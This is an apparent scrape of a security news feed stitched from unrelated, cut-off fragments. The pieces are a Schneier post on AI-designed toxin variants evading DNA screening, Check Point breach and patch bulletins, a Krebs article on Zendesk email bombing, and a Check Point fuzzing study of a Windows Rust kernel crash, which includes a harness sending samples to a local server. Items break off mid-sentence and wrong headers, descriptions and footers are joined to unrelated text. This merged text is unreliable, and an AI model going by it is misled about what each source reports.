&lt;p&gt;In any case, DNA sequences encoding all 75,000 designs were fed into the software that screens DNA orders for potential threats. One thing that was very clear is that there were huge variations in the ability of the four screening programs to flag these variant designs as threatening. Two of them seemed to do a pretty good job, one was mixed, and another let most of them through. Three of the software packages were updated in response to this performance, which significantly improved their ability to pick out variants.&lt;/p&gt;
&lt;p&gt;There was also a clear trend in all four screening packages: The closer the variant was to the original structurally, the more likely the package (both before and after the patches) was to be able to flag it as a threat. In all cases, there was also a cluster of variant designs that were unlikely to fold into a similar structure, and these generally weren&amp;#8217;t flagged as threats.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;The research is all preliminary, and there are a lot of ways in which the experiment diverges from reality. But I am not optimistic about this particular arms race. I think that the ability of AI systems to create something deadly will advance faster than the ability of AI systems to detect its components.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.schneier.com/?p=71059</guid><category>Uncategorized</category><category>AI</category><category>biological warfare</category></item><item><title>Social Engineering People’s Credit Card Details</title><link>https://www.schneier.com/blog/archives/2025/10/social-engineering-peoples-credit-card-details.html</link><description>&lt;p&gt;Good &lt;i&gt;Wall Street Journal&lt;/i&gt; &lt;a href="https://www.wsj.com/tech/cybersecurity/url-scam-texts-china-gangs-68e96097?st=XcjCtr&amp;#038;reflink=desktopwebshare_permalink&amp;#038;utm_source=substack&amp;#038;utm_medium=email"&gt;article&lt;/a&gt; on criminal gangs that scam people out of their credit card information:&lt;/p&gt;

Envoy Air, American Airlines largest regional carrier, has also &lt;/span&gt;&lt;a href="https://therecord.media/regional-airline-envoy-oracle"&gt;&lt;span&gt;confirmed&lt;/span&gt;&lt;/a&gt;&lt;span&gt; a cyber attack leading to the theft of a limited amount of business and commercial data.&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;i&gt;&lt;span&gt;Check Point IPS provides protection against this threat&lt;/span&gt;&lt;/i&gt; &lt;i&gt;&lt;span&gt;(Oracle Concurrent Processing Remote Code Execution)&lt;/span&gt;&lt;/i&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span&gt;Australian airliner Qantas has &lt;/span&gt;&lt;a href="https://www.theguardian.com/business/2025/oct/11/hackers-leak-qantas-data-containing-5-million-customer-records-after-ransom-deadline-passes"&gt;&lt;span&gt;suffered&lt;/span&gt;&lt;/a&gt;&lt;span&gt; a data breach that resulted in the leak of roughly 5 million customers’ personal details after attackers accessed a third-party platform integrated with Salesforce. The Scattered LAPSUS$ Hunters ransomware group is responsible for the attack.&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span&gt;Clothing retailer MANGO &lt;/span&gt;&lt;a href="https://securityaffairs.com/183435/data-breach/spanish-fashion-retailer-mango-disclosed-a-data-breach.html"&gt;&lt;span&gt;experienced&lt;/span&gt;&lt;/a&gt;&lt;span&gt; a data breach following the compromise of a marketing vendor, which exposed customer information. The leaked data includes some personal details of customers but excludes financial details. No threat actor has claimed responsibility yet.&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span&gt;Sotheby, major auctions and private sales corporation, has &lt;/span&gt;&lt;a href="https://www.securityweek.com/hackers-steal-sensitive-data-from-auction-house-sothebys/"&gt;&lt;span&gt;suffered&lt;/span&gt;&lt;/a&gt;&lt;span&gt; a data breach involving the theft of sensitive employee information, including full names, Social Security numbers, and financial account details. No threat actor has claimed responsibility yet.&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;/li&gt;

&lt;li&gt;&lt;span&gt;Dairy Farmers of America has &lt;/span&gt;&lt;a href="https://www.scworld.com/brief/ransomware-related-breach-confimed-by-dairy-farmers-of-america"&gt;&lt;span&gt;been&lt;/span&gt;&lt;/a&gt;&lt;span&gt; victim of a cyber attack exposing personal data belonging to 4,546 employees and cooperative members. The breach disrupted operations across several manufacturing plants and was carried out through a sophisticated social engineering campaign. The Play ransomware gang claimed responsibility for the attack.&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;i&gt;&lt;span&gt;Check Point Threat Emulation and Harmony Endpoint provide protection against this threat&lt;/span&gt;&lt;/i&gt; &lt;i&gt;&lt;span&gt;(Ransomware.Win.Play; Ransomware.Wins.PLAY)&lt;/span&gt;&lt;/i&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;

&lt;li&gt;&lt;span&gt;Michigan City, Indiana has &lt;/span&gt;&lt;a href="https://therecord.media/michigan-indiana-city-ransomware"&gt;&lt;span&gt;confirmed&lt;/span&gt;&lt;/a&gt;&lt;span&gt; a ransomware attack that caused significant network disruption and led to the theft of 450 GB of municipal data, affecting both online and telephone services for city employees. The Obscura ransomware gang has taken responsibility, stating that all stolen data was leaked publicly after ransom demands were ignored. More than 30,000 residents were impacted as critical city operations and multiple government systems suffered widespread outages.&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span&gt;Check Point Research has &lt;/span&gt;&lt;a href="https://research.checkpoint.com/2025/denial-of-fuzzing-rust-in-the-windows-kernel/"&gt;&lt;span&gt;identified&lt;/span&gt;&lt;/a&gt;&lt;span&gt; a security vulnerability in the Rust-based Windows kernel component function in the Graphics Device Interface (GDI). The vulnerability, exploitable from low-integrity user space on Windows 11 24H2, was reproducibly triggered through extensive fuzzing using mutated EMF+ samples containing malformed path data. Microsoft addressed this issue as a moderate-severity denial-of-service in OS Build 26100.4202 (KB5058499) by restructuring the affected function and increasing internal checks, as confirmed by CPR’s technical analysis and proof-of-concept.&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span&gt;Microsoft’s October Patch Tuesday &lt;/span&gt;&lt;a href="https://msrc.microsoft.com/update-guide/releaseNote/2025-Oct"&gt;&lt;span&gt;addressed&lt;/span&gt;&lt;/a&gt;&lt;span&gt; 175 vulnerabilities, including three zero-days (CVE-2025-59230, CVE-2025-24990, and CVE-2025-47827) observed under active exploitation, where successful attacks could result in SYSTEM privileges or Secure Boot bypass in Windows and IGEL OS. Two critical 9.8-severity vulnerabilities were also fixed: CVE-2025-59287 enabling remote code execution via deserialization in Windows Server Update Service, and CVE-2025-59246 allowing privilege escalation in Azure Entra ID.&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;i&gt;&lt;span&gt;Check point IPS blade provides protection against these threats &lt;/span&gt;&lt;/i&gt;&lt;i&gt;&lt;span&gt;((Microsoft Windows Remote Access Connection Manager Privilege Escalation (CVE-2025-59230), Agere Modem Driver Privilege Escalation (CVE-2025-24990)&lt;/span&gt;&lt;/i&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;i&gt;&lt;span&gt;Microsoft Windows Server Update Service Remote Code Execution (CVE-2025-59287))&lt;/span&gt;&lt;/i&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span&gt;A critical-severity HTTP request smuggling vulnerability, tracked as CVE-2025-55315 with a CVSS score of 9.9, was &lt;/span&gt;&lt;a href="https://www.securityweek.com/highest-ever-severity-score-assigned-by-microsoft-to-asp-net-core-vulnerability/"&gt;&lt;span&gt;patched&lt;/span&gt;&lt;/a&gt;&lt;span&gt; in ASP.NET Core’s Kestrel web server. Successful exploitation allows attackers to bypass security features, hijack user credentials, tamper with files, or trigger denial-of-service by smuggling malicious HTTP requests within legitimate ones. The vulnerability impacts multiple versions of ASP.NET Core and Visual Studio.&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;/li&gt;

&lt;li&gt;&lt;span&gt;Check Point Research has &lt;/span&gt;&lt;a href="https://blog.checkpoint.com/research/microsoft-dominates-phishing-impersonations-in-q3-2025/"&gt;&lt;span&gt;released&lt;/span&gt;&lt;/a&gt;&lt;span&gt; an overview of phishing trends in Q3 2025, identifying Microsoft as the most impersonated brand in phishing campaigns, accounting for 40% of all brand spoofing attempts, followed by Google (9%) and Apple (6%). The tech sector led impersonation activity, while PayPal and DHL also returned to the top 10 list, reflecting an increased targeting of financial and shipping services through convincing fraudulent login pages that harvest user credentials and sensitive personal data. Attackers leveraged legitimate branding and emotional triggers to deceive users into submitting information on fake sites mimicking trusted companies.&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;li&gt;&lt;span&gt;Over 266,000 F5 BIG-IP instances have been &lt;/span&gt;&lt;a href="https://www.bleepingcomputer.com/news/security/over-266-000-f5-big-ip-instances-exposed-to-remote-attacks/"&gt;&lt;span&gt;found&lt;/span&gt;&lt;/a&gt;&lt;span&gt; exposed online following the disclosure of a security breach, in which nation-state attackers accessed F5 source code and sensitive information about undisclosed BIG-IP vulnerabilities. The newly released patches &lt;/span&gt;&lt;a href="https://my.f5.com/manage/s/article/K000156572"&gt;&lt;span&gt;address&lt;/span&gt;&lt;/a&gt;&lt;span&gt; 44 vulnerabilities impacting products including BIG-IP, F5OS, BIG-IQ, and APM, with observed threat actor activity linked to Chinese UNC5291 and malware such as Brickstorm, Zipline, and Spawnant. Exploitation of these vulnerabilities could enable attackers to steal credentials and API keys, move laterally within affected networks, establish persistence, and exfiltrate sensitive data.&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;/li&gt;

&lt;p&gt;The post &lt;a href="https://www.techrepublic.com/article/news-raids-ai-beta-launch/"&gt;Safety Monitoring Platform RAIDS AI Makes Beta Launch&lt;/a&gt; appeared first on &lt;a href="https://www.techrepublic.com"&gt;TechRepublic&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4332052</guid><category>Artificial Intelligence</category><category>News</category><category>Startups</category><category>ai</category><category>ai safety</category><category>RAIDS AI</category></item><item><title>Email Bombs Exploit Lax Authentication in Zendesk</title><link>https://krebsonsecurity.com/2025/10/email-bombs-exploit-lax-authentication-in-zendesk/</link><description>Cybercriminals are abusing a widespread lack of authentication in the customer service platform Zendesk to flood targeted email inboxes with menacing messages that come from hundreds of Zendesk corporate customers simultaneously.</description><content:encoded>&lt;p&gt;Cybercriminals are abusing a widespread lack of authentication in the customer service platform &lt;strong&gt;Zendesk&lt;/strong&gt; to flood targeted email inboxes with menacing messages that come from hundreds of Zendesk corporate customers simultaneously.&lt;/p&gt;
&lt;p&gt;Zendesk is an automated help desk service designed to make it simple for people to contact companies for customer support issues. Earlier this week, KrebsOnSecurity started receiving thousands of ticket creation notification messages through Zendesk in rapid succession, each bearing the name of different Zendesk customers, such as &lt;strong&gt;CapCom&lt;/strong&gt;, &lt;strong&gt;CompTIA&lt;/strong&gt;, &lt;strong&gt;Discord&lt;/strong&gt;, &lt;strong&gt;GMAC&lt;/strong&gt;, &lt;strong&gt;NordVPN&lt;/strong&gt;, &lt;strong&gt;The Washington Post&lt;/strong&gt;, and&lt;strong&gt; Tinder&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;The abusive missives sent via Zendesk&amp;#8217;s platform can include any subject line chosen by the abusers. In my case, the messages variously warned about a supposed law enforcement investigation involving KrebsOnSecurity.com, or else contained personal insults.&lt;/p&gt;
&lt;p&gt;Moreover, the automated messages that are sent out from this type of abuse all come from customer domain names &amp;#8212; not from Zendesk. In the example below, replying to any of the junk customer support responses from The Washington Post&amp;#8217;s Zendesk installation shows the reply-to address is help@washpost.com.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_72398" style="width: 759px;"&gt;&lt;img alt="" class=" wp-image-72398" height="362" src="https://krebsonsecurity.com/wp-content/uploads/2025/10/zendeskwapo.png" width="749" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-72398"&gt;One of dozens of messages sent to me this week by The Washington Post.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Notified about the mass abuse of their platform, Zendesk said the emails were ticket creation notifications from customer accounts that configured their Zendesk instance to allow anyone to submit support requests &amp;#8212; including anonymous users.&lt;/p&gt;
&lt;p&gt;&amp;#8220;These types of support tickets can be part of a customer’s workflow, where a prior verification is not required to allow them to engage and make use of the Support capabilities,&amp;#8221; said &lt;strong&gt;Carolyn Camoens&lt;/strong&gt;, communications director at Zendesk. &amp;#8220;Although we recommend our customers to permit only verified users to submit tickets, some Zendesk customers prefer to use an anonymous environment to allow for tickets to be created due to various business reasons.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Camoens said requests that can be submitted in an anonymous manner can also make use of an email address of the submitter&amp;#8217;s choice.&lt;/p&gt;
&lt;p&gt;&amp;#8220;However, this method can also be used for spam requests to be created on behalf of third party email addresses,&amp;#8221; Camoens said. &amp;#8220;If an account has enabled the auto-responder trigger based on ticket creation, then this allows for the ticket notification email to be sent from our customer’s accounts to these third parties. The notification will also include the Subject added by the creator of these tickets.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Zendesk claims it uses rate limits to prevent a high volume of requests from being created at once, but those limits did not stop Zendesk customers from flooding my inbox with thousands of messages in just a few hours.&lt;/p&gt;
&lt;p&gt;&amp;#8220;We recognize that our systems were leveraged against you in a distributed, many-against-one manner,&amp;#8221; Camoens said. &amp;#8220;We are actively investigating additional preventive measures. We are also advising customers experiencing this type of activity to follow our general security best practices and configure an authenticated ticket creation workflow.&amp;#8221;&lt;/p&gt;
&lt;p&gt;In all of the cases above, the messaging abuse would not have been possible if Zendesk customers validated support request email addresses prior to sending responses. Failing to do so may make it easier for Zendesk clients to handle customer support requests, but it also allows ne&amp;#8217;er-do-wells to sully the sender&amp;#8217;s brand in service of disruptive and malicious email floods.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=72392</guid><category>A Little Sunshine</category><category>Latest Warnings</category><category>The Coming Storm</category><category>Web Fraud 2.0</category><category>CapCom</category><category>Carolyn Camoens</category><category>CompTIA</category><category>Discord</category><category>GMAC</category><category>NordVPN</category><category>The Washington Post</category><category>Tinder</category><category>Zendesk</category></item><item><title>Securing Windows Policy</title><link>https://www.techrepublic.com/resource-library/it-policy/securing-windows/</link><description>&lt;p&gt;Organizations can use this policy for securing Windows on computers used to conduct company business.

&lt;p&gt;&lt;em&gt;Fuzzing&lt;/em&gt;, a widely used software testing technique, involves providing invalid, unexpected, or random data as inputs to the program being tested for the purpose of identifying bugs. Fuzzing is a key part of our proactive approach to security testing, and we regularly apply fuzzing to widely used systems, such as Microsoft’s Windows operating system, to identify and address potential vulnerabilities before they can be exploited by malicious actors.&lt;/p&gt;



&lt;p&gt;A reliable testing environment is essential for this kind of work.&amp;nbsp;&lt;a href="https://github.com/googleprojectzero/winafl"&gt;&lt;code&gt;WinAFL&lt;/code&gt;&lt;/a&gt;&amp;nbsp;is a highly capable fuzzer, known for its role in identifying numerous publicly acknowledged vulnerabilities over the years, and was specifically adapted to target Windows binaries. To conduct mid-scale fuzz testing efficiently, we need to use a management tool like&amp;nbsp;&lt;a href="https://github.com/sgabe/winaflpet"&gt;&lt;code&gt;WinAFL Pet&lt;/code&gt;&lt;/a&gt;. These tools simplify the creation, configuration and monitoring of fuzzing jobs, while streamlining the evaluation of any crashes detected in the application. As running multiple fuzzer instances over several days &amp;#8211; or even weeks &amp;#8211; can result in numerous crashes, it is important to promptly analyze what caused the program failures.&amp;nbsp;&lt;a href="https://github.com/SkyLined/BugId"&gt;&lt;code&gt;BugId&lt;/code&gt;&lt;/a&gt;&amp;nbsp;provides a comprehensive and rapid analysis of the underlying reasons behind a program’s crash.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;GDI&lt;/code&gt;&amp;nbsp;is a well-known core component of the Windows operating system, offering two-dimensional vector graphics, imaging, and typography. It enhances the&amp;nbsp;&lt;em&gt;Graphics Device Interface&lt;/em&gt;&amp;nbsp;found in earlier versions of Windows by introducing new features and optimizing existing ones.&lt;/p&gt;

The&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-emfplus/5f92c789-64f2-46b5-9ed4-15a9bb0946c6"&gt;Enhanced Metafile Format Plus&lt;/a&gt;&amp;nbsp;(&lt;code&gt;EMF+&lt;/code&gt;) is a variant of&amp;nbsp;&lt;code&gt;EMF&lt;/code&gt;&amp;nbsp;metafiles where&amp;nbsp;&lt;code&gt;EMF+&lt;/code&gt;&amp;nbsp;records are embedded within&amp;nbsp;&lt;code&gt;EMF&lt;/code&gt;&amp;nbsp;records. This embedding is made possible by the ability of&amp;nbsp;&lt;code&gt;EMF&lt;/code&gt;&amp;nbsp;to include arbitrary private data in an&amp;nbsp;&lt;code&gt;EMR_COMMENT_EMFPLUS&lt;/code&gt;&amp;nbsp;record. Additionally, multiple&amp;nbsp;&lt;code&gt;EMF+&lt;/code&gt;&amp;nbsp;records can be embedded in a single&amp;nbsp;&lt;code&gt;EMF&lt;/code&gt;&amp;nbsp;record, as illustrated by&amp;nbsp;&lt;em&gt;Figure 1.&lt;/em&gt;&lt;/p&gt;

&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;em&gt;Figure 1.&lt;/em&gt;&amp;nbsp;Metafiles with embedded EMF+ records (Source: Microsoft).&lt;/p&gt;



&lt;p&gt;&lt;code&gt;EMF&lt;/code&gt;&amp;nbsp;files represent a significant attack surface. Because of their compact file size, these files are particularly suitable for fuzz testing. Although&amp;nbsp;&lt;code&gt;EMF&lt;/code&gt;&amp;nbsp;files were the focus of multiple vulnerability disclosures in the past, the transition to the&amp;nbsp;&lt;code&gt;EMF+&lt;/code&gt;&amp;nbsp;format is less extensively studied and analyzed. The&amp;nbsp;&lt;code&gt;EMF+&lt;/code&gt;&amp;nbsp;format introduced a variety of new metafile records, increasing the complexity of processing these files. Therefore, in our current research, we focus on the long-standing attack surface of the&amp;nbsp;&lt;code&gt;GDI&lt;/code&gt;&amp;nbsp;subsystem related to the handling of metafiles and build on prior research on the&amp;nbsp;&lt;code&gt;EMF&lt;/code&gt;&amp;nbsp;format.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="test-execution"&gt;&lt;strong&gt;Test execution&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;We launched a fuzzing campaign with a corpus of only 16 initial seed files, including several samples based on the&amp;nbsp;&lt;code&gt;EMF+&lt;/code&gt;&amp;nbsp;format. Within only a few days of testing, the fuzzer identified several potential security vulnerabilities whose possible impacts range from information disclosure to arbitrary code execution. During the fuzzing campaign, we encountered a recurring system crash &amp;#8211; which we call a&amp;nbsp;&lt;em&gt;Denial of Fuzzing&lt;/em&gt;&amp;nbsp;condition &amp;#8211; that disrupted our research and led to an unexpected discovery. After a week of testing, the test system crashed and restarted due to a&amp;nbsp;&lt;code&gt;BugCheck&lt;/code&gt;. This suggested that the fuzzer came across a bug affecting the Windows kernel. Given that our main focus was on user-space fuzzing, there was no straightforward method available to reproduce the crash in this scenario. Nevertheless, restarting the test campaign led to the same outcome: the system crashed again after a few days of testing, confirming the presence of a bug in the Windows kernel triggered by extensive mutations of the initial seed corpus.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="hunting-for-a-bugcheck"&gt;Hunting for a BugCheck&lt;/h2&gt;



&lt;h3 class="wp-block-heading" id="sharpening-the-axe"&gt;&lt;strong&gt;Sharpening the axe&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;This led to a shift in our focus from discovering additional vulnerabilities to tracking down this specific bug in the Windows kernel and reproducing the crash consistently. To achieve this, our first step was to enable capturing the memory dumps so we could analyze the state of the operating system at the time of the crash. However, because we used a RAM disk for file storage and the fuzzer instances were running in shared-memory mode (enabled with the&amp;nbsp;&lt;code&gt;-s&lt;/code&gt;&amp;nbsp;option in&amp;nbsp;&lt;code&gt;WinAFL&lt;/code&gt;) to improve testing speed, determining which sample was being processed at the time of the crash remained a challenge, like trying to find a needle in a haystack. Restarting the fuzzing campaign confirmed that the system crash consistently occurred after a few days of testing and allowed us to gather multiple memory snapshots to analyze the mutated samples processed by the crashing fuzzer instance.&lt;/p&gt;



&lt;p&gt;An initial attempt to locate the potential culprit in the memory dump by searching for&amp;nbsp;&lt;code&gt;EMF&lt;/code&gt;&amp;nbsp;signatures did not yield the desired outcome, as running each potential sample through the testing harness failed to reproduce the crash. To address this, we explored the possibility of extracting files from the&amp;nbsp;&lt;code&gt;queue&lt;/code&gt;&amp;nbsp;folder of the crashing fuzzer instance using the complete memory dump. One potential solution was to use&amp;nbsp;&lt;code&gt;Volatility&lt;/code&gt;, the well-known memory forensics tool, capable of identifying files with the&amp;nbsp;&lt;code&gt;FileScan&lt;/code&gt;&amp;nbsp;module and extracting them using the&amp;nbsp;&lt;code&gt;DumpFiles&lt;/code&gt;&amp;nbsp;module. However, this method proved less suitable for efficiently saving a large volume of files automatically.&lt;/p&gt;



&lt;p&gt;The&amp;nbsp;&lt;code&gt;forensic&lt;/code&gt;&amp;nbsp;mode of the&amp;nbsp;&lt;a href="https://github.com/ufrisk/MemProcFS"&gt;&lt;code&gt;MemProcFS&lt;/code&gt;&lt;/a&gt;&amp;nbsp;tool can automatically identify files within a complete memory dump. Because a RAM disk was used during testing, we obtained a complete snapshot of the actual state of the fuzzer at the moment of the system crash. Our next goal was to reduce the time window required to reproduce the error. We achieved this by initiating new fuzzing campaigns with seed files derived from the samples extracted from the&amp;nbsp;&lt;code&gt;queue&lt;/code&gt;&amp;nbsp;folder of the crashing fuzzer instance. These new test campaigns reached the mutation phase more quickly, resulting in the system crash occurring sooner.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="approaching-the-prey"&gt;&lt;strong&gt;Approaching the prey&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;Despite the progress, we were still unable to reproduce the error at will. Eventually, we achieved a setup where a single fuzzer instance could trigger the mutation causing the error within 30 minutes, using a data set of 836 files. This advancement allowed us to modify our fuzzing harness to transmit the mutated test files to a remote server over the network. The primary goal of this approach was to have minimal impact on the fuzzer and ensure it did not negatively affect performance or stability. To accomplish this, we supplemented the harness with the following&amp;nbsp;&lt;code&gt;send_data()&lt;/code&gt;&amp;nbsp;function, designed to transmit each tested sample to a remote server. After establishing the connection, the function sends the size of the data followed by the actual data, handling any potential errors at each step by cleaning up and returning an error code if necessary.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;int send_data(char* data, uint32_t size) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    wchar_t ip_address[] = L"192.168.1.1";
    
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);

    if (WSAStartup(MAKEWORD(2, 2), &amp;amp;wsa) != 0) {
        return 1;
    }

    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    if (InetPton(AF_INET, ip_address, &amp;amp;(server.sin_addr)) != 1) {
        closesocket(s);
        WSACleanup();
        return 1;
    }

    if (connect(s, (struct sockaddr*)&amp;amp;server, sizeof(server)) &amp;lt; 0) {
        closesocket(s);
        WSACleanup();
        return 1;
    }

    uint32_t size_header = htonl(size);
    if (send(s, (char*)&amp;amp;size_header, sizeof(size_header), 0) &amp;lt; 0) {
        closesocket(s);
        WSACleanup();
        return 1;
    }

    if (send(s, data, size, 0) &amp;lt; 0) {
        closesocket(s);
        WSACleanup();
        return 1;
    }

    closesocket(s);
    WSACleanup();
    return 0;
}&lt;/pre&gt;



&lt;p&gt;&lt;em&gt;Listing 1.&lt;/em&gt;&amp;nbsp;Client-side modification to send every mutation to the server.&lt;/p&gt;



&lt;p&gt;On the server side, the following Python script actively listens for incoming connections. Each connection is handled in a separate thread, where the script receives samples from the fuzzing harness and saves them as individual files. After&amp;nbsp;&lt;code&gt;5,000&lt;/code&gt;&amp;nbsp;files are collected, the script compresses them into a&amp;nbsp;&lt;code&gt;ZIP&lt;/code&gt;&amp;nbsp;archive and deletes the original files to optimize storage usage.&lt;/p&gt;

&lt;p&gt;This modification allowed us to reproduce the error, even if it resulted from processing multiple different test files. During the first test run after updating the fuzzing harness, the system successfully crashed after&amp;nbsp;&lt;code&gt;30&lt;/code&gt;&amp;nbsp;minutes. Based on the sample files logged on the server, the campaign reached the mutation responsible for generating the file that caused the crash after an impressive&amp;nbsp;&lt;code&gt;380,000&lt;/code&gt;&amp;nbsp;mutations. The technical analysis of the vulnerability is outlined in the following sections.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="the-prey"&gt;The prey&lt;/h2&gt;



&lt;h3 class="wp-block-heading" id="when-things-went-wrong"&gt;&lt;strong&gt;When things went wrong&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;We found a crash via a system service exception that occurred during the execution of a&amp;nbsp;&lt;code&gt;NtGdiSelectClipPath&lt;/code&gt;&amp;nbsp;syscall within version&amp;nbsp;&lt;a href="https://msdl.microsoft.com/download/symbols/win32kbase_rs.sys/0EB63E4225000/win32kbase_rs.sys"&gt;&lt;code&gt;10.0.26100.3037&lt;/code&gt;&lt;/a&gt;&amp;nbsp;of the&amp;nbsp;&lt;code&gt;win32kbase_rs.sys&lt;/code&gt;&amp;nbsp;driver. The stack trace from this crash shows Microsoft’s efforts to enhance security by reimplementing the&amp;nbsp;&lt;code&gt;REGION&lt;/code&gt;&amp;nbsp;data type of the&amp;nbsp;&lt;code&gt;GDI&lt;/code&gt;&amp;nbsp;subsystem using Rust in the Windows kernel, as discussed by a presentation on&amp;nbsp;&lt;a href="https://www.youtube.com/watch?v=8T6ClX-y2AE&amp;amp;t=3070s"&gt;&lt;em&gt;Default Security&lt;/em&gt;&lt;/a&gt;&amp;nbsp;at the&amp;nbsp;&lt;em&gt;BlueHat IL&lt;/em&gt;&amp;nbsp;2023 conference. This transition is evident in how the&amp;nbsp;&lt;code&gt;Win32kRS::RegionCore_set_from_path()&lt;/code&gt;&amp;nbsp;function within the&amp;nbsp;&lt;code&gt;win32kbase.sys&lt;/code&gt;&amp;nbsp;driver calls a function with the same name in the new&amp;nbsp;&lt;code&gt;win32kbase_rs.sys&lt;/code&gt;&amp;nbsp;driver. Notably, the system crash was triggered by this new kernel component designed to improve security, as suggested by the name of the&amp;nbsp;&lt;code&gt;panic_bounds_check()&lt;/code&gt;&amp;nbsp;function referenced in the stack trace shown in&amp;nbsp;&lt;em&gt;Figure 2&lt;/em&gt;.&lt;/p&gt;



&lt;figure class="wp-block-image"&gt;&lt;img alt="&amp;lt;em&amp;gt;Figure 2.&amp;lt;/em&amp;gt; Stack trace of the system service exception." src="https://research.checkpoint.com/wp-content/uploads/2025/10/BAUF67CFQB-image2.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 2.&lt;/em&gt;&amp;nbsp;Stack trace of the system service exception.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;According to the decompiled source code of the vulnerable version of the&amp;nbsp;&lt;code&gt;win32kbase_rs.sys&lt;/code&gt;&amp;nbsp;kernel driver, the system crashes when the&amp;nbsp;&lt;code&gt;v109&lt;/code&gt;&amp;nbsp;index exceeds the allowed&amp;nbsp;&lt;code&gt;v86&lt;/code&gt;&amp;nbsp;range as shown in&amp;nbsp;&lt;em&gt;Figure 3&lt;/em&gt;, triggering a kernel panic. This issue is likely caused by the&amp;nbsp;&lt;code&gt;v88&lt;/code&gt;&amp;nbsp;and&amp;nbsp;&lt;code&gt;v95&lt;/code&gt;&amp;nbsp;loop variables incrementing beyond valid limits without proper safeguards.&lt;/p&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-32015" height="445" src="https://research.checkpoint.com/wp-content/uploads/2025/10/BAUF67CFQB-image3-1024x445.png" width="1024" /&gt;&lt;/figure&gt;



&lt;p&gt;&lt;em&gt;Figure 3.&lt;/em&gt;&amp;nbsp;Decompiled source code of the&amp;nbsp;&lt;code&gt;region_from_path_mut()&lt;/code&gt;&amp;nbsp;function.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="the-reason-behind-the-bug"&gt;&lt;strong&gt;The reason behind the bug&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;When the&amp;nbsp;&lt;code&gt;region_from_path_mut()&lt;/code&gt;&amp;nbsp;function converts a path into a region it represents the outline as a singly linked list of edge blocks. The program detects the out-of-bounds memory access via&amp;nbsp;&lt;code&gt;core::panicking::panic_bounds_check()&lt;/code&gt;&amp;nbsp;and triggers a&amp;nbsp;&lt;code&gt;SYSTEM_SERVICE_EXCEPTION&lt;/code&gt;.&lt;/p&gt;



&lt;p&gt;The first metafile record in the crash sample that drives the execution flow into the&amp;nbsp;&lt;code&gt;region_from_path_mut()&lt;/code&gt;&amp;nbsp;function is the&amp;nbsp;&lt;code&gt;EmfPlusDrawBeziers&lt;/code&gt;&amp;nbsp;record. The path geometry resulting from this record produces the specific edge blocks responsible for the memory corruption. When the system plays this record, the geometric pen specified in the&amp;nbsp;&lt;code&gt;EmfPlusObject&lt;/code&gt;&amp;nbsp;record makes the stroke wide. The malformed‐path data eventually causes the out-of-bounds condition when the path is widened, flattened, and converted to a region in the kernel.&lt;/p&gt;



